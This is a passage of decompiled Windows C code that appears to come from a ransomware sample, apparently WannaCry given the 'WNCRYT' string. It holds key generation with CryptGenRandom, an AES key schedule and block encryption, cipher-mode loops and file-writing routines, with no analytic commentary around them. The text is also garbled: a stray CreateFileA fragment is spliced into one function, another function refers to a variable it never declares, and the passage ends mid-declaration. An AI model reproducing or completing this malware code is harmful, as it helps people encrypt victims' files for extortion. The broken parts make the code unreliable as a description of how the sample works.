        for (uVar5 = uVar1 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
          *(uint8_t *)puVar9 = *(uint8_t *)puVar8;
          puVar8 = (DWORD *)((int)puVar8 + 1);
          puVar9 = (DWORD *)((int)puVar9 + 1);
        }
        puStack00000008 = (DWORD *)((int)puStack00000008 + uVar1);
        uStack00000004 = uStack00000004 + 1;
      } while (uStack00000004 < uVar6);
    }
    puVar3 = &stack0x00000014;
    iVar4 = 0x1000;
    do {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
      iVar4 = iVar4 + -1;
    } while (iVar4 != 0);
    return puStack0000000c;
  }
  puVar3 = &stack0x00000014;
  iVar4 = 0x1000;
  do {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
    iVar4 = iVar4 + -1;
  } while (iVar4 != 0);
  return (DWORD *)0x0;
}

bool FUN_10003c40(LPCSTR param_1)

{
  DWORD *lpBuffer;
  HANDLE hFile;
  DWORD local_8;
  DWORD local_4;
  
  local_8 = 0;
  local_4 = 0;
  if (param_1 == (LPCSTR)0x0) {
    return false;
  }
  lpBuffer = FUN_10004170();
  if (lpBuffer == (DWORD *)0x0) {
    return false;
  }
  hFile = CreateFileA(param_1, 0x40000000, 1, nullptr, 3, 0x80, nullptr);

if (hFile != (HANDLE)0xffffffff) {
    SetFilePointer(hFile, 0, (PLONG)0x0, 2);
    WriteFile(hFile, &local_8, 4, &local_4, nullptr);
    WriteFile(hFile, lpBuffer, local_8, &local_4, nullptr);
}
  GlobalFree(lpBuffer);
  return local_4 == local_8;
}

DWORD __stdcall FUN_10003ac0(void *pThis, LPCSTR param_1, LPCSTR param_2)

{
  bool bVar1;
  int iVar2;
  undefined3 extraout_var;
  
  iVar2 = FUN_10003a80((int)pThis);
  if (iVar2 == 0) {
    FUN_10003bb0((int)pThis);
    return 0;
  }
  if (param_1 == (LPCSTR)0x0) {
    iVar2 = (*DAT_1000d940)(*(undefined4 *)((int)pThis + 4),&DAT_1000d054,0x114,0,0,(int)pThis + 8);
    if (iVar2 == 0) {
      FUN_10003bb0((int)this);
      return 0;
    }
  }
  else {
    iVar2 = FUN_10003c00(this,param_1);
    if (iVar2 == 0) {
      iVar2 = (*DAT_1000d940)(*(undefined4 *)((int)this + 4),&DAT_1000cf40,0x114,0,0,(int)this + 0xc
                             );
      if (iVar2 == 0) {
LAB_10003b86:
        FUN_10003bb0((int)this);
        return 0;
      }
      bVar1 = FUN_10004350(*(undefined4 *)((int)this + 4),(HCRYPTKEY *)((int)this + 8));
      if (CONCAT31(extraout_var,bVar1) == 0) goto LAB_10003b86;
      iVar2 = FUN_10004040(*(undefined4 *)((int)this + 4),*(HCRYPTKEY *)((int)this + 8),6,param_1);
      if (iVar2 == 0) goto LAB_10003b86;
      if (param_2 != (LPCSTR)0x0) {
        FUN_10003c40(param_2);
      }
      iVar2 = FUN_10003c00(this,param_1);
      if (iVar2 == 0) goto LAB_10003b86;
    }
    if (*(int *)((int)this + 0xc) != 0) {
      (*DAT_1000d944)(*(int *)((int)this + 0xc));
    }
  }
  return 1;
}

   DWORD __cdecl FUN_10001830(void *self,LPCSTR param_1, DWORD param_2, DWORD param_3)

{
  int iVar1;
  HGLOBAL pvVar2;
  HANDLE pvVar3;
  DWORD _Seed;
  
  iVar1 = FUN_10003ac0((void *)((int)self + 4),param_1,(LPCSTR)0x0);
  if (iVar1 == 0) {
    return 0;
  }
  if (param_1 != (LPCSTR)0x0) {
    FUN_10003ac0((void *)((int)self + 0x2c),(LPCSTR)0x0,(LPCSTR)0x0);
  }
  pvVar2 = GlobalAlloc(0,0x100000);
  *(HGLOBAL *)((int)self + 0x4c8) = pvVar2;
  if (pvVar2 == (HGLOBAL)0x0) {
    return 0;
  }
  pvVar2 = GlobalAlloc(0,0x100000);
  *(HGLOBAL *)((int)self + 0x4cc) = pvVar2;
  if (pvVar2 == (HGLOBAL)0x0) {
    return 0;
  }
  InitializeCriticalSection((LPCRITICAL_SECTION)((int)self + 0x4ec));
  pvVar3 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_100029e0,self,0,
                        (LPDWORD)0x0);
  *(HANDLE *)((int)self + 0x4d8) = pvVar3;
  *(uint32_t *)((int)self + 0x4d4) = param_2;
  *(uint32_t *)((int)self + 0x4d0) = param_3;
  _Seed = GetTickCount();
  srand(_Seed);
  return 1;
}



void __thiscall FUN_100018f0(void *this,uint32_t param_1,uint32_t param_2)

{
  *(DWORD *)((int)this + 0x91c) = param_1;
  *(DWORD *)((int)this + 0x918) = param_2;
  return;
}



void __thiscall FUN_10001910(void *this,wchar_t *param_1)

{
  int iVar1;
  
  wcscpy((wchar_t *)((int)this + 0x504),param_1);
  iVar1 = *(int *)((int)this + 0x914);
  *(int *)((int)this + 0x914) = iVar1 + 1;
  swprintf((wchar_t *)((int)this + 0x70c),0x1000cbb8,(wchar_t *)((int)this + 0x504),iVar1,
           u__WNCRYT_1000cbc8);
  return;
}

void __thiscall FUN_10004420(void *this,BYTE *param_1,DWORD param_2)

{
  CryptGenRandom(*(HCRYPTPROV *)((int)this + 4),param_2,param_1);
  return;
}

typedef int (__cdecl *DAT_1000d948_t)(DWORD, int, int, int, BYTE*, DWORD*);
extern DAT_1000d948_t DAT_1000d948;

FUN_10004370(void *this,BYTE *param_1,DWORD param_2,BYTE *param_3,undefined4 *param_4)

{
  LPCRITICAL_SECTION lpCriticalSection;
  BYTE *pBVar1;
  uint32_t *puVar2;
  int iVar3;
  unsigned int uVar4;
  BYTE *pBVar5;
  DWORD uVar6;
  
  if (*(int *)((int)this + 8) == 0) {
    return 0;
  }
  iVar3 = FUN_10004420(this,param_1,param_2);
  pBVar1 = param_3;
  if (iVar3 == 0) {
    return 0;
  }
  if ((param_3 != (BYTE *)0x0) && (param_4 != (undefined4 *)0x0)) {
    pBVar5 = param_3;
    for (uVar4 = param_2 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
      *(DWORD *)pBVar5 = *(DWORD *)param_1;
      param_1 = param_1 + 4;
      pBVar5 = pBVar5 + 4;
    }
    for (uVar4 = param_2 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
      *pBVar5 = *param_1;
      param_1 = param_1 + 1;
      pBVar5 = pBVar5 + 1;
    }
    lpCriticalSection = (LPCRITICAL_SECTION)((int)this + 0x10);
    EnterCriticalSection(lpCriticalSection);
    puVar2 = param_4;
    uVar6 = *param_4;
    iVar3 = (*DAT_1000d948)(*(uint32_t *)((int)this + 8),0,1,0,pBVar1,&param_2);
    if (iVar3 == 0) {
      LeaveCriticalSection(lpCriticalSection);
      return 0;
    }
    LeaveCriticalSection(lpCriticalSection);
    *puVar2 = uVar6;
  }
  return 1;
}

void __thiscall FUN_10005dc0(void *this,byte *param_1,byte *param_2,int param_3,uint param_4)

{
  byte bVar1;
  DWORD uVar2;
  int iVar3;
  uint *puVar4;
  uint uVar5;
  uint uVar6;
  int iVar7;
  byte *pbVar8;
  int iVar9;
  int iVar10;
  byte *pbVar11;
  DWORD *puVar12;
  int iVar13;
  uint *puVar14;
  DWORD *puVar15;
  exception local_c [12];
  
  if (param_1 == (byte *)0x0) {
    param_1 = &DAT_1000d8d8;
    exception::exception(local_c,(char **)&param_1);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
  }
  if (((param_3 != 0x10) && (param_3 != 0x18)) && (param_3 != 0x20)) {
    param_1 = &DAT_1000d8d8;
    exception::exception(local_c,(char **)&param_1);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
  }
  if (((param_4 != 0x10) && (param_4 != 0x18)) && (param_4 != 0x20)) {
    param_1 = &DAT_1000d8d8;
    exception::exception(local_c,(char **)&param_1);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
  }
  *(int *)((int)this + 0x3c8) = param_3;
  *(uint *)((int)this + 0x3cc) = param_4;
  pbVar8 = param_2;
  pbVar11 = (byte *)((int)this + 0x3d0);
  for (uVar5 = param_4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
    *(DWORD *)pbVar11 = *(uint32_t *)pbVar8;
    pbVar8 = pbVar8 + 4;
    pbVar11 = pbVar11 + 4;
  }
  for (uVar5 = param_4 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
    *pbVar11 = *pbVar8;
    pbVar8 = pbVar8 + 1;
    pbVar11 = pbVar11 + 1;
  }
  uVar5 = *(uint *)((int)this + 0x3cc);
  pbVar8 = (byte *)((int)this + 0x3f0);
  for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
    *(DWORD *)pbVar8 = *(DWORD *)param_2;
    param_2 = param_2 + 4;
    pbVar8 = pbVar8 + 4;
  }
  for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
    *pbVar8 = *param_2;
    param_2 = param_2 + 1;
    pbVar8 = pbVar8 + 1;
  }
  if (*(int *)((int)this + 0x3c8) == 0x10) {
    if (*(int *)((int)this + 0x3cc) == 0x10) {
      iVar7 = 10;
    }
    else {
      iVar7 = (-(uint)(*(int *)((int)this + 0x3cc) != 0x18) & 2) + 0xc;
    }
    *(int *)((int)this + 0x410) = iVar7;
  }
  else if (*(int *)((int)this + 0x3c8) == 0x18) {
    *(uint *)((int)this + 0x410) = (-(uint)(*(int *)((int)this + 0x3cc) != 0x20) & 0xfffffffe) + 0xe
    ;
  }
  else {
    *(DWORD *)((int)this + 0x410) = 0xe;
  }
  iVar9 = 0;
  iVar7 = (int)(*(int *)((int)this + 0x3cc) + (*(int *)((int)this + 0x3cc) >> 0x1f & 3U)) >> 2;
  if (-1 < *(int *)((int)this + 0x410)) {
    puVar12 = (DWORD *)((int)this + 8);
    do {
      iVar13 = iVar7;
      puVar15 = puVar12;
      if (0 < iVar7) {
        for (; iVar13 != 0; iVar13 = iVar13 + -1) {
          *puVar15 = 0;
          puVar15 = puVar15 + 1;
        }
      }
      iVar9 = iVar9 + 1;
      puVar12 = puVar12 + 8;
    } while (iVar9 <= *(int *)((int)this + 0x410));
  }
  iVar9 = 0;
  if (-1 < *(int *)((int)this + 0x410)) {
    puVar12 = (DWORD *)((int)this + 0x1e8);
    do {
      iVar13 = iVar7;
      puVar15 = puVar12;
      if (0 < iVar7) {
        for (; iVar13 != 0; iVar13 = iVar13 + -1) {
          *puVar15 = 0;
          puVar15 = puVar15 + 1;
        }
      }
      iVar9 = iVar9 + 1;
      puVar12 = puVar12 + 8;
    } while (iVar9 <= *(int *)((int)this + 0x410));
  }
  puVar4 = (uint *)((int)this + 0x414);
  iVar9 = (*(int *)((int)this + 0x410) + 1) * iVar7;
  pbVar11 = (byte *)((int)(*(int *)((int)this + 0x3c8) + (*(int *)((int)this + 0x3c8) >> 0x1f & 3U))
                    >> 2);
  pbVar8 = param_1;
  param_1 = pbVar11;
  if (0 < (int)pbVar11) {
    do {
      *puVar4 = (uint)*pbVar8 << 0x18;
      *puVar4 = *puVar4 | (uint)pbVar8[1] << 0x10;
      *puVar4 = *puVar4 | (uint)pbVar8[2] << 8;
      *puVar4 = *puVar4 | (uint)pbVar8[3];
      param_1 = param_1 + -1;
      pbVar8 = pbVar8 + 4;
      puVar4 = puVar4 + 1;
    } while (param_1 != (byte *)0x0);
  }
  iVar13 = 0;
  if (0 < (int)pbVar11) {
    param_1 = (byte *)((int)this + 0x414);
    do {
      if (iVar9 <= iVar13) goto LAB_100061e6;
      iVar3 = iVar13 / iVar7;
      iVar10 = iVar13 % iVar7;
      *(undefined4 *)((int)this + (iVar10 + iVar3 * 8) * 4 + 8) = *(undefined4 *)param_1;
      iVar13 = iVar13 + 1;
      uVar2 = *(undefined4 *)param_1;
      param_1 = param_1 + 4;
      *(undefined4 *)((int)this + (iVar10 + (*(int *)((int)this + 0x410) - iVar3) * 8) * 4 + 0x1e8)
           = uVar2;
    } while (iVar13 < (int)pbVar11);
  }
  if (iVar13 < iVar9) {
    param_2 = &DAT_1000ac3c;
    do {
      uVar5 = *(uint *)((int)this + (int)pbVar11 * 4 + 0x410);
      bVar1 = *param_2;
      param_2 = param_2 + 1;
      *(uint *)((int)this + 0x414) =
           *(uint *)((int)this + 0x414) ^
           CONCAT31(CONCAT21(CONCAT11((&DAT_10007a3c)[uVar5 >> 0x10 & 0xff] ^ bVar1,
                                      (&DAT_10007a3c)[uVar5 >> 8 & 0xff]),
                             (&DAT_10007a3c)[uVar5 & 0xff]),(&DAT_10007a3c)[uVar5 >> 0x18]);
      if (pbVar11 == (byte *)0x8) {
        puVar4 = (uint *)((int)this + 0x418);
        iVar3 = 3;
        do {
          *puVar4 = *puVar4 ^ puVar4[-1];
          puVar4 = puVar4 + 1;
          iVar3 = iVar3 + -1;
        } while (iVar3 != 0);
        uVar5 = *(uint *)((int)this + 0x420);
        iVar3 = 3;
        *(uint *)((int)this + 0x424) =
             *(uint *)((int)this + 0x424) ^
             CONCAT31(CONCAT21(CONCAT11((&DAT_10007a3c)[uVar5 >> 0x18],
                                        (&DAT_10007a3c)[uVar5 >> 0x10 & 0xff]),
                               (&DAT_10007a3c)[uVar5 >> 8 & 0xff]),(&DAT_10007a3c)[uVar5 & 0xff]);
        puVar4 = (uint *)((int)this + 0x428);
        do {
          *puVar4 = *puVar4 ^ puVar4[-1];
          puVar4 = puVar4 + 1;
          iVar3 = iVar3 + -1;
        } while (iVar3 != 0);
      }
      else if (1 < (int)pbVar11) {
        puVar4 = (uint *)((int)this + 0x418);
        pbVar8 = pbVar11 + -1;
        do {
          *puVar4 = *puVar4 ^ puVar4[-1];
          puVar4 = puVar4 + 1;
          pbVar8 = pbVar8 + -1;
        } while (pbVar8 != (byte *)0x0);
      }
      param_1 = (byte *)0x0;
      if (0 < (int)pbVar11) {
        puVar12 = (uint32_t *)((int)this + 0x414);
        do {
          if (iVar9 <= iVar13) goto LAB_100061e6;
          iVar3 = iVar13 / iVar7;
          iVar10 = iVar13 % iVar7;
          *(DWORD *)((int)this + (iVar10 + iVar3 * 8) * 4 + 8) = *puVar12;
          param_1 = param_1 + 1;
          iVar13 = iVar13 + 1;
          *(uint32_t *)
           ((int)this + (iVar10 + (*(int *)((int)this + 0x410) - iVar3) * 8) * 4 + 0x1e8) = *puVar12
          ;
          puVar12 = puVar12 + 1;
        } while ((int)param_1 < (int)pbVar11);
      }
    } while (iVar13 < iVar9);
  }
LAB_100061e6:
  param_4 = 1;
  if (1 < *(int *)((int)this + 0x410)) {
    puVar4 = (uint *)((int)this + 0x208);
    do {
      puVar14 = puVar4;
      iVar9 = iVar7;
      if (0 < iVar7) {
        do {
          uVar5 = *puVar14;
          iVar9 = iVar9 + -1;
          *puVar14 = *(uint *)(&DAT_10009c3c + (uVar5 >> 0x18) * 4) ^
                     *(uint *)(&DAT_1000a03c + (uVar5 >> 0x10 & 0xff) * 4) ^
                     *(uint *)(&DAT_1000a43c + (uVar5 >> 8 & 0xff) * 4) ^
                     *(uint *)(&DAT_1000a83c + (uVar5 & 0xff) * 4);
          puVar14 = puVar14 + 1;
        } while (iVar9 != 0);
      }
      param_4 = param_4 + 1;
      puVar4 = puVar4 + 8;
    } while ((int)param_4 < *(int *)((int)this + 0x410));
  }
  *(undefined1 *)((int)this + 4) = 1;
  return;
}

void __thiscall FUN_10006280(void *this,byte *param_1,byte *param_2)

{
  DWORD uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  uint uVar6;
  int iVar7;
  uint local_24;
  uint local_20;
  uint local_1c;
  exception local_c [12];
  
  if (*(char *)((int)this + 4) != '\0') {
    local_1c = ((uint)*param_1 << 0x18 | (uint)param_1[1] << 0x10 | (uint)param_1[2] << 8 |
               (uint)param_1[3]) ^ *(uint *)((int)this + 8);
    local_20 = ((uint)param_1[4] << 0x18 | (uint)param_1[5] << 0x10 | (uint)param_1[6] << 8 |
               (uint)param_1[7]) ^ *(uint *)((int)this + 0xc);
    uVar3 = ((uint)param_1[8] << 0x18 | (uint)param_1[9] << 0x10 | (uint)param_1[10] << 8 |
            (uint)param_1[0xb]) ^ *(uint *)((int)this + 0x10);
    local_24 = *(uint *)((int)this + 0x14) ^
               ((uint)CONCAT11(param_1[0xe],param_1[0xf]) |
               (uint)param_1[0xc] << 0x18 | (uint)param_1[0xd] << 0x10);
    iVar7 = *(int *)((int)this + 0x410);
    if (1 < iVar7) {
      param_1 = (byte *)(iVar7 + -1);
      uVar2 = local_24;
      uVar4 = uVar3;
      puVar5 = (uint *)((int)this + 0x30);
      do {
        uVar6 = *(uint *)(&DAT_1000843c + (uVar2 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_1000803c + (uVar4 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_10007c3c + (local_20 >> 0x18) * 4) ^
                *(uint *)(&DAT_1000883c + (local_1c & 0xff) * 4) ^ puVar5[-1];
        uVar3 = *(uint *)(&DAT_1000803c + (uVar2 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_10007c3c + (uVar4 >> 0x18) * 4) ^
                *(uint *)(&DAT_1000843c + (local_1c >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_1000883c + (local_20 & 0xff) * 4) ^ *puVar5;
        local_24 = *(uint *)(&DAT_10007c3c + (uVar2 >> 0x18) * 4) ^
                   *(uint *)(&DAT_1000843c + (local_20 >> 8 & 0xff) * 4) ^
                   *(uint *)(&DAT_1000803c + (local_1c >> 0x10 & 0xff) * 4) ^
                   *(uint *)(&DAT_1000883c + (uVar4 & 0xff) * 4) ^ puVar5[1];
        local_1c = *(uint *)(&DAT_1000843c + (uVar4 >> 8 & 0xff) * 4) ^
                   *(uint *)(&DAT_1000803c + (local_20 >> 0x10 & 0xff) * 4) ^
                   *(uint *)(&DAT_10007c3c + (local_1c >> 0x18) * 4) ^
                   *(uint *)(&DAT_1000883c + (uVar2 & 0xff) * 4) ^ puVar5[-2];
        param_1 = param_1 + -1;
        uVar2 = local_24;
        uVar4 = uVar3;
        puVar5 = puVar5 + 8;
        local_20 = uVar6;
      } while (param_1 != (byte *)0x0);
    }
    iVar7 = iVar7 * 0x20;
    uVar1 = *(undefined4 *)(iVar7 + 8 + (int)this);
    *param_2 = (&DAT_10007a3c)[local_1c >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[1] = (&DAT_10007a3c)[local_20 >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_1._0_1_ = (byte)uVar1;
    param_2[2] = (&DAT_10007a3c)[uVar3 >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    param_2[3] = (&DAT_10007a3c)[local_24 & 0xff] ^ (byte)param_1;
    uVar1 = *(undefined4 *)((int)this + iVar7 + 0xc);
    param_2[4] = (&DAT_10007a3c)[local_20 >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[5] = (&DAT_10007a3c)[uVar3 >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_1._0_1_ = (byte)uVar1;
    param_2[6] = (&DAT_10007a3c)[local_24 >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    param_2[7] = (&DAT_10007a3c)[local_1c & 0xff] ^ (byte)param_1;
    uVar1 = *(undefined4 *)((int)this + iVar7 + 0x10);
    param_2[8] = (&DAT_10007a3c)[uVar3 >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[9] = (&DAT_10007a3c)[local_24 >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_1._0_1_ = (byte)uVar1;
    param_2[10] = (&DAT_10007a3c)[local_1c >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    param_2[0xb] = (&DAT_10007a3c)[local_20 & 0xff] ^ (byte)param_1;
    uVar1 = *(undefined4 *)((int)this + iVar7 + 0x14);
    param_2[0xc] = (&DAT_10007a3c)[local_24 >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[0xd] = (&DAT_10007a3c)[local_1c >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_2[0xe] = (&DAT_10007a3c)[local_20 >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    param_1._0_1_ = (byte)uVar1;
    param_2[0xf] = (&DAT_10007a3c)[uVar3 & 0xff] ^ (byte)param_1;
    return;
  }
  exception::exception(local_c,&PTR_DAT_1000d8cc);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
}

void __thiscall FUN_10006640(void *this,uint *param_1,byte *param_2)

{
   DWORD uVar1;
  int iVar2;
  uint *puVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  DWORD *puVar7;
  byte *pbVar8;
  uint uVar9;
  uint32_t *puVar10;
  int iVar11;
  uint *local_30;
  uint *local_28;
  int local_24;
  exception local_c [12];
  
  if (*(char *)((int)this + 4) == '\0') {
    exception::exception(local_c,&PTR_DAT_1000d8cc);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
  }
  iVar5 = *(int *)((int)this + 0x3cc);
  if (iVar5 != 0x10) {
    iVar5 = (int)(iVar5 + (iVar5 >> 0x1f & 3U)) >> 2;
    if (iVar5 == 4) {
      iVar2 = 0;
    }
    else {
      iVar2 = (iVar5 != 6) + 1;
    }
    iVar4 = (&DAT_1000ac64)[iVar2 * 8];
    iVar11 = (&DAT_1000ac6c)[iVar2 * 8];
    iVar2 = (&DAT_1000ac74)[iVar2 * 8];
    if (0 < iVar5) {
      local_30 = (uint *)((int)this + 8);
      puVar3 = (uint *)((int)this + 0x454);
      local_28 = (uint *)iVar5;
      do {
        *puVar3 = (uint)(byte)*param_1 << 0x18;
        uVar9 = *puVar3 | (uint)*(byte *)((int)param_1 + 1) << 0x10;
        *puVar3 = uVar9;
        *puVar3 = uVar9 | (uint)*(byte *)((int)param_1 + 2) << 8;
        *puVar3 = *puVar3 | (uint)*(byte *)((int)param_1 + 3);
        param_1 = param_1 + 1;
        *puVar3 = *puVar3 ^ *local_30;
        local_30 = local_30 + 1;
        local_28 = (uint *)((int)local_28 + -1);
        puVar3 = puVar3 + 1;
      } while (local_28 != (uint *)0x0);
    }
    local_24 = 1;
    if (1 < *(int *)((int)this + 0x410)) {
      param_1 = (uint *)((int)this + 0x28);
      do {
        if (0 < iVar5) {
          local_28 = param_1;
          iVar6 = iVar4;
          puVar3 = (uint *)((int)this + 0x434);
          local_30 = (uint *)iVar5;
          do {
            uVar9 = *local_28;
            local_28 = local_28 + 1;
            *puVar3 = *(uint *)(&DAT_1000843c +
                               (uint)*(byte *)((int)this +
                                              (((iVar11 - iVar4) + iVar6) % iVar5) * 4 + 0x455) * 4)
                      ^ *(uint *)(&DAT_1000883c +
                                 (*(uint *)((int)this +
                                           (((iVar2 - iVar4) + iVar6) % iVar5) * 4 + 0x454) & 0xff)
                                 * 4) ^
                      *(uint *)(&DAT_1000803c +
                               (uint)*(byte *)((int)this + (iVar6 % iVar5) * 4 + 0x456) * 4) ^
                      *(uint *)(&DAT_10007c3c + (uint)*(byte *)((int)puVar3 + 0x23) * 4) ^ uVar9;
            iVar6 = iVar6 + 1;
            local_30 = (uint *)((int)local_30 + -1);
            puVar3 = puVar3 + 1;
          } while (local_30 != (uint *)0x0);
        }
        puVar7 = (DWORD *)((int)this + 0x434);
        puVar10 = (DWORD *)((int)this + 0x454);
        for (iVar6 = iVar5; iVar6 != 0; iVar6 = iVar6 + -1) {
          *puVar10 = *puVar7;
          puVar7 = puVar7 + 1;
          puVar10 = puVar10 + 1;
        }
        local_24 = local_24 + 1;
        param_1 = param_1 + 8;
      } while (local_24 < *(int *)((int)this + 0x410));
    }
    param_1 = (uint *)0x0;
    if (0 < iVar5) {
      iVar4 = iVar4 - iVar11;
      iVar2 = iVar2 - iVar11;
      pbVar8 = param_2;
      param_2 = (byte *)((int)this + 0x454);
      do {
        uVar1 = *(uint32_t *)
                 ((int)this + (int)(param_1 + *(int *)((int)this + 0x410) * 2) * 4 + 8);
        *pbVar8 = (&DAT_10007a3c)[param_2[3]] ^ (byte)((uint)uVar1 >> 0x18);
        pbVar8[1] = (&DAT_10007a3c)[*(byte *)((int)this + ((iVar4 + iVar11) % iVar5) * 4 + 0x456)] ^
                    (byte)((uint)uVar1 >> 0x10);
        pbVar8[2] = (&DAT_10007a3c)[*(byte *)((int)this + (iVar11 % iVar5) * 4 + 0x455)] ^
                    (byte)((uint)uVar1 >> 8);
        pbVar8[3] = (&DAT_10007a3c)
                    [*(uint *)((int)this + ((iVar2 + iVar11) % iVar5) * 4 + 0x454) & 0xff] ^
                    (byte)uVar1;
        pbVar8 = pbVar8 + 4;
        param_1 = (uint *)((int)param_1 + 1);
        param_2 = param_2 + 4;
        iVar11 = iVar11 + 1;
      } while ((int)param_1 < iVar5);
    }
    return;
  }
  FUN_10006280(this,(byte *)param_1,param_2);
  return;
}

void __thiscall FUN_10006940(void *this,uint *param_1,uint *param_2,uint param_3,uint param_4)

{
  uint *puVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  uint *puVar6;
  bool bVar7;
  exception local_c [12];
  
  if (*(char *)((int)this + 4) == '\0') {
    exception::exception(local_c,&PTR_DAT_1000d8cc);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
  }
  if ((param_3 != 0) && (uVar4 = *(uint *)((int)this + 0x3cc), param_3 % uVar4 == 0)) {
    if (param_4 == 1) {
       ) && (hFile = CreateFileA(param_4,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0),
      if (param_3 / uVar4 != 0) {
        puVar2 = (uint *)((int)this + 0x3f0);
        do {
          if (*(char *)((int)this + 4) == '\0') {
            exception::exception(local_c,&PTR_DAT_1000d8cc);
                    // WARNING: Subroutine does not return
            _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
          }
          iVar5 = 0;
          if (0 < (int)uVar4) {
            puVar1 = puVar2;
            do {
              *(byte *)puVar1 =
                   (byte)*puVar1 ^ *(byte *)(((int)param_1 - (int)puVar2) + (int)puVar1);
              puVar1 = (uint *)((int)puVar1 + 1);
              iVar5 = iVar5 + 1;
            } while (iVar5 < *(int *)((int)this + 0x3cc));
          }
          FUN_10006640(this,puVar2,(byte *)param_2);
          uVar4 = *(uint *)((int)this + 0x3cc);
          puVar1 = param_2;
          puVar6 = puVar2;
          for (uVar3 = uVar4 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
            *puVar6 = *puVar1;
            puVar1 = puVar1 + 1;
            puVar6 = puVar6 + 1;
          }
          for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
            *(char *)puVar6 = (char)*puVar1;
            puVar1 = (uint *)((int)puVar1 + 1);
            puVar6 = (uint *)((int)puVar6 + 1);
          }
          uVar4 = *(uint *)((int)this + 0x3cc);
          param_1 = (uint *)((int)param_1 + uVar4);
          param_2 = (uint *)((int)param_2 + uVar4);
          param_4 = param_4 + 1;
        } while (param_4 < param_3 / uVar4);
      }
    }
    else {
      bVar7 = param_4 == 2;
      param_4 = 0;
      if (bVar7) {
        if (param_3 / uVar4 != 0) {
          do {
            FUN_10006640(this,(uint *)((int)this + 0x3f0),(byte *)param_2);
            if (*(char *)((int)this + 4) == '\0') {
              exception::exception(local_c,&PTR_DAT_1000d8cc);
                    // WARNING: Subroutine does not return
              _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
            }
            iVar5 = 0;
            puVar2 = param_2;
            if (0 < *(int *)((int)this + 0x3cc)) {
              do {
                *(byte *)puVar2 = (byte)*puVar2 ^ *(byte *)(iVar5 + (int)param_1);
                puVar2 = (uint *)((int)puVar2 + 1);
                iVar5 = iVar5 + 1;
              } while (iVar5 < *(int *)((int)this + 0x3cc));
            }
            uVar4 = *(uint *)((int)this + 0x3cc);
            puVar2 = param_2;
            puVar1 = (uint *)((int)this + 0x3f0);
            for (uVar3 = uVar4 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
              *puVar1 = *puVar2;
              puVar2 = puVar2 + 1;
              puVar1 = puVar1 + 1;
            }
            for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
              *(byte *)puVar1 = (byte)*puVar2;
              puVar2 = (uint *)((int)puVar2 + 1);
              puVar1 = (uint *)((int)puVar1 + 1);
            }
            uVar4 = *(uint *)((int)this + 0x3cc);
            param_1 = (uint *)((int)param_1 + uVar4);
            param_2 = (uint *)((int)param_2 + uVar4);
            param_4 = param_4 + 1;
          } while (param_4 < param_3 / uVar4);
          return;
        }
      }
      else if (param_3 / uVar4 != 0) {
        do {
          FUN_10006640(this,param_1,(byte *)param_2);
          uVar4 = *(uint *)((int)this + 0x3cc);
          param_1 = (uint *)((int)param_1 + uVar4);
          param_2 = (uint *)((int)param_2 + uVar4);
          param_4 = param_4 + 1;
        } while (param_4 < param_3 / uVar4);
        return;
      }
    }
    return;
  }
  exception::exception(local_c,&PTR_DAT_1000d8d0);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_c,(ThrowInfo *)&DAT_1000af00);
}

int __thiscall FUN_10001960(void *this,undefined4 param_1,LPCWSTR param_2,uint param_3)

{
  HANDLE pvVar1;
  BOOL BVar2;
  unsigned int uVar3;
  byte *pbVar4;
  int iVar5;
  unsigned int uVar6;
  int *piVar7;
  uint32_t uVar8;
  int *piVar9;
  uint32_t *puVar10;
  HANDLE hFile;
  bool bVar11;
  unsigned int local_758;
  uint8_t local_754 [512];
  BYTE local_554 [512];
  HANDLE local_354;
  uint32_t local_350;
